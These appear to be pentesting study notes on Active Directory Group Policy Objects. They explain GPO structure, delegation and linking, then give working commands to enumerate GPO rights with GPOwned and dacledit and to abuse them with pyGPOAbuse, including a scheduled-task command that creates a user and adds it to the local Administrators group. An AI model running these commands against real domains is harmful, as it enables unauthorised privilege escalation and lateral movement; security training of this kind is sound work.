### **What are GPOs (Group Policy Objects)?**

- Centralized configs for users/computers in a Windows domain.
- Managed using **Group Policy Management Console (GPMC)**.
- Automates tasks like: security settings, UI changes, software configs.


---

###  GPO Components

- **GPC (Group Policy Container)**: Metadata stored in AD (LDAP).
    - Path: `CN={GUID},CN=Policies,...`
- **GPT (Group Policy Template)**: Actual policy files stored in SYSVOL.
    
    - Path: `\\<DC>\SysVol\<domain>\Policies\{GUID}`

### **Refresh Behavior**

- Applied on reboot/login.
- Refreshed every 90 mins + random offset (up to 30 mins).

From an attacker's perspective, if we gain access to accounts, we can modify existing policies or create new ones, which allows us to execute code or perform unauthorized actions on any computer where the policy applies


### What is **GPO Delegation**?

**GPO Delegation** is the process of assigning permissions to specific users or groups so they can **manage, edit, or link** Group Policy Objects (GPOs) ‚Äî without needing full domain admin rights.

#### **How to Delegate GPO Rights (GUI way)**:

1. Open **`gpmc.msc`** (Group Policy Management Console).
2. Navigate to the GPO you want to delegate.
3. Go to the **Delegation** tab.
4. Click **Add** ‚Üí select a user/group
5. Assign one of the following permissions:
    
    - **Read** ‚Äì Default, allows viewing only.
    - **Edit settings** ‚Äì Can change the GPO settings.
    - **Edit settings, delete, modify security** ‚Äì Full control over GPO.

### What is a **GPO Link**?

A **GPO Link** connects a **Group Policy Object (GPO)** to a specific container in **Active Directory**, such as:

- A **Site**
- A **Domain**
- An **Organizational Unit (OU)**

‚ö†Ô∏è **Without linking**, a GPO does **nothing**. It must be **linked** to some AD container to take effect.

### **GPO Processing Order**

1. Local
2. Site
3. Domain
4. OU  
    (OU has highest precedence unless **block inheritance** is used.)

- **Enforced GPOs** override block inheritance and take priority.

### GPO Attacks
Types of rights that can be abused to escalate privileges or move laterally using GPOs.

- modify a GPO - can be used to alter gpo. including Executing commands
- ability to link a GPO-  can be used to link a gpo to a site or domain combine with modify a gpo
- create a GPO - combine with  ability to link a GPO


### GPO Enumeration ‚Äì What to Look For:

As an attacker or pentester, focus on **4 key things**:

1. Non-admins who can _modify_ GPOs
    
    - To find GPOs vulnerable to changes by low-priv users.
    - Useful for injecting malicious scripts or commands
2. **üîó Where GPOs are _linked_**
    - GPOs only take effect when linked to a container (OU, domain, or site).
    - Helps identify which **users/computers will be affected** if you modify a GPO.
3. **üßë‚Äçüîó Non-admins who can _link_ GPOs**
    - If a user can link an existing GPO to a container, they can apply settings to devices.
    - This lets you push malicious policies without modifying the GPO itself.
4. **üì¶ Non-admins who can _create_ GPOs**
    
    - If you can create a new GPO and have linking rights, you can deploy malicious settings.
    - A powerful way to escalate without needing full domain admin rights.

---

### GPO Enumeration and Abuse from Linux

1. **Enumerating GPOs:** Use **GPOwned** to list GPOs:
    
    ```bash
    proxychains4 -q python3 GPOwned.py -u username -p password -d domain.local -dc-ip DC_IP -gpcmachine -listgpo
    ```
    
    This lists the GPOs and their details.
    
2. **Finding GPO Links:** To find where GPOs are linked:
    
    ```bash
    proxychains4 -q python3 GPOwned.py -u username -p password -d domain.local -dc-ip DC_IP -gpcmachine -listgplink
    ```
    
3. **Checking GPO Modification Rights:** Use **dacledit** to check DACLs for modification rights:
    
    ```bash
    proxychains4 -q python3 examples/dacledit.py domain.local/username:password -target-dn "CN={GPO_GUID},CN=Policies,CN=System,DC=domain,DC=local" dc-ip DC_IP
    ```
    
4. **Abusing GPOs:** Use **pyGPOAbuse** to execute commands via GPO:
    
    Install **pyGPOAbuse**:
    
    ```bash
    git clone https://github.com/Hackndo/pyGPOAbuse
    cd pyGPOAbuse
    python3 -m pip install -r requirements.txt
    ```
    
    Example to add a user to the Admin group:
    
    ```bash
    proxychains4 -q python3 pygpoabuse.py domain.local/username:password -gpo-id GPO_ID -command "net user user password /add && net localgroup Administrators user /add" -taskname "TaskName" -dc-ip DC_IP
    ```
    
5. **Backup GPO:** Backup a GPO before modifying it:
    
    ```bash
    proxychains4 -q python3 GPOwned.py -u username -p password -d domain.local -dc-ip DC_IP -gpcmachine -backup backupgpo name "{GPO_GUID}"
    ```
    

### Summary:

1. **List GPOs** and **links** with **GPOwned**.
    
2. **Check DACLs** for modification rights with **dacledit**.
    
3. **Abuse GPOs** using **pyGPOAbuse** to execute commands.
    
4. **Backup GPOs** before any changes.


Tools
- powerview
- bloodhound
- GPOwned.py
- pyGPOAbuse